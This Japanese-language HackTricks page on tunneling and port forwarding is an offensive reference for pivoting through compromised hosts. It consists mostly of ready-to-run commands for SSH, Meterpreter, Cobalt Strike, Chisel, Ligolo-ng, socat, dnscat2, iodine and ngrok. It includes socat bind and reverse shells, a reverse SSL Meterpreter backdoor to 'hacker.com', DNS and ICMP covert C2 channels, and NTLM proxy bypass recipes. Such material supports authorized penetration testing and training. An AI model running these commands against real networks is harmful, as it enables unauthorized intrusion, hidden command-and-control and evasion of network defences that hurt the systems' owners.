# トンネリングとポートフォワーディング

{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}

## Nmapのヒント

{% hint style="warning" %}
**ICMP**および**SYN**スキャンはソックスプロキシを通じてトンネリングできないため、**pingディスカバリーを無効にする**（`-Pn`）必要があり、**TCPスキャン**（`-sT`）を指定する必要があります。
{% endhint %}

## **Bash**

**ホスト -> ジャンプ -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSHグラフィカル接続 (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

SSHサーバーで新しいポートを開く --> 他のポート
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

ローカルポート --> 侵害されたホスト (SSH) --> 第三\_ボックス:ポート
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

ローカルポート --> 侵害されたホスト (SSH) --> どこでも
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### リバースポートフォワーディング

これは、DMZを通じて内部ホストからあなたのホストへのリバースシェルを取得するのに役立ちます：
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

両方のデバイスで**rootが必要**です（新しいインターフェースを作成するため）およびsshdの設定でrootログインを許可する必要があります：\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
サーバー側で転送を有効にする
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
クライアント側に新しいルートを設定する
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

あなたは**ssh**を介してホストを通じて**サブネットワーク**へのすべての**トラフィック**を**トンネリング**できます。\
例えば、10.10.10.0/24へのすべてのトラフィックを転送することです。
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
プライベートキーで接続する
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

ローカルポート --> 侵害されたホスト（アクティブセッション） --> 第三のボックス:ポート
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
別の方法：
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKSプロキシ

すべてのインターフェースでリッスンしているteamserverにポートを開き、**ビコーンを通じてトラフィックをルーティングする**ことができます。
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
この場合、**ポートはビーコーンホストで開かれます**、チームサーバーではなく、トラフィックはチームサーバーに送信され、そこから指定されたホスト:ポートに送信されます。
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
To note:

- Beaconのリバースポートフォワードは、**個々のマシン間の中継ではなく、Team Serverへのトラフィックをトンネリングするために設計されています**。
- トラフィックは**BeaconのC2トラフィック内でトンネリングされます**、P2Pリンクを含みます。
- **管理者権限は必要ありません** 高ポートでリバースポートフォワードを作成するために。

### rPort2Port local

{% hint style="warning" %}
この場合、**ポートはbeaconホストで開かれます**、Team Serverではなく、**トラフィックはCobalt Strikeクライアントに送信されます**（Team Serverではなく）、そこから指定されたホスト:ポートに送信されます。
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

ウェブファイルトンネルをアップロードする必要があります: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)のリリースページからダウンロードできます。\
**クライアントとサーバーで同じバージョンを使用する必要があります。**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### ポートフォワーディング
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**エージェントとプロキシには同じバージョンを使用してください**

### トンネリング
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### エージェントバインディングとリスニング
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

リバーストンネル。トンネルは被害者から開始されます。\
127.0.0.1:1080にsocks4プロキシが作成されます。
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
**NTLMプロキシ**を介してピボットする
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### バインドシェル
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### リバースシェル
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port through socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### MeterpreterをSSL Socat経由で
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
あなたは被害者のコンソールで最後の行の代わりにこの行を実行することで**非認証プロキシ**をバイパスできます:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat トンネル

**/bin/sh コンソール**

クライアントとサーバーの両方で証明書を作成します。
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

ローカルSSHポート（22）を攻撃者ホストの443ポートに接続します。
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

これはコンソール版のPuTTYのようなもので（オプションはsshクライアントに非常に似ています）。

このバイナリは被害者のコンピュータで実行され、sshクライアントであるため、リバース接続を確立するためにsshサービスとポートを開く必要があります。次に、ローカルでアクセス可能なポートを私たちのマシンのポートに転送するには：
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

ローカル管理者である必要があります（任意のポートについて）
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

**システムへのRDPアクセスが必要です**。\
ダウンロード:

1. [SocksOverRDP x64 バイナリ](https://github.com/nccgroup/SocksOverRDP/releases) - このツールは、Windowsのリモートデスクトップサービス機能からの`Dynamic Virtual Channels`（`DVC`）を使用します。DVCは**RDP接続を介してパケットをトンネリングする**役割を担っています。
2. [Proxifier ポータブルバイナリ](https://www.proxifier.com/download/#win-tab)

クライアントコンピュータで**`SocksOverRDP-Plugin.dll`**を次のように読み込みます:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
今、私たちは **`mstsc.exe`** を使用して **RDP** 経由で **victim** に **接続** でき、**SocksOverRDP プラグインが有効になっている** という **プロンプト** が表示され、**127.0.0.1:1080** で **リッスン** することになります。

**RDP** 経由で **接続** し、victim マシンに `SocksOverRDP-Server.exe` バイナリをアップロードして実行します:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
今、あなたのマシン（攻撃者）でポート1080がリッスンしていることを確認してください：
```
netstat -antb | findstr 1080
```
今、[**Proxifier**](https://www.proxifier.com/) **を使用して、そのポートを通じてトラフィックをプロキシできます。**

## Windows GUIアプリをプロキシ化する

[**Proxifier**](https://www.proxifier.com/)を使用して、Windows GUIアプリをプロキシ経由でナビゲートさせることができます。\
**Profile -> Proxy Servers** でSOCKSサーバーのIPとポートを追加します。\
**Profile -> Proxification Rules** でプロキシ化するプログラムの名前と、プロキシ化したいIPへの接続を追加します。

## NTLMプロキシバイパス

前述のツール: **Rpivot**\
**OpenVPN** もこれをバイパスでき、設定ファイルにこれらのオプションを設定します:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

プロキシに対して認証を行い、指定した外部サービスに転送されるローカルポートをバインドします。これにより、このポートを介してお好みのツールを使用できます。\
例えば、ポート443を転送します。
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
今、例えば被害者の**SSH**サービスをポート443でリッスンするように設定した場合、攻撃者はポート2222を通じて接続できます。\
また、**meterpreter**を使用してlocalhost:443に接続し、攻撃者がポート2222でリッスンしていることも可能です。

## YARP

Microsoftによって作成されたリバースプロキシです。こちらで見つけることができます: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNSトンネリング

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

両方のシステムでルート権限が必要で、DNSクエリを使用してトンネルアダプタを作成し、データをトンネルします。
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
トンネルは非常に遅くなります。このトンネルを通じて圧縮されたSSH接続を作成するには、次のコマンドを使用します:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**ここからダウンロード**](https://github.com/iagox86/dnscat2)**.**

DNSを通じてC\&Cチャネルを確立します。ルート権限は必要ありません。
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShellで**

[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)を使用して、PowerShellでdnscat2クライアントを実行できます：
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscatを使用したポートフォワーディング**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### プロキシチェインのDNSを変更する

Proxychainsは`gethostbyname` libcコールをインターセプトし、tcp DNSリクエストをsocksプロキシを通じてトンネリングします。**デフォルト**では、proxychainsが使用する**DNS**サーバーは**4.2.2.2**（ハードコーディングされています）。これを変更するには、ファイルを編集します: _/usr/lib/proxychains3/proxyresolv_ そしてIPを変更します。**Windows環境**にいる場合は、**ドメインコントローラー**のIPを設定できます。

## Goでのトンネル

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMPトンネリング

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

両方のシステムでルート権限が必要で、tunアダプタを作成し、ICMPエコーリクエストを使用してデータをトンネリングします。
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**ここからダウンロード**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/) は、1つのコマンドラインでソリューションをインターネットに公開するためのツールです。**
*公開URIは次のようになります:* **UID.ngrok.io**

### インストール

- アカウントを作成: https://ngrok.com/signup
- クライアントのダウンロード:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### 基本的な使用法

**ドキュメント:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

*必要に応じて、認証とTLSを追加することも可能です。*

#### TCPトンネリング
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTPを使用してファイルを公開する
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### HTTPコールのスニッフィング

*XSS、SSRF、SSTIに便利...*
stdoutから直接、またはHTTPインターフェース [http://127.0.0.1:4040](http://127.0.0.1:4000) で。

#### 内部HTTPサービスのトンネリング
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml シンプルな設定例

3つのトンネルを開きます：
- 2つのTCP
- /tmp/httpbin/ からの静的ファイルの公開を伴う1つのHTTP
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## その他のチェックツール

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}
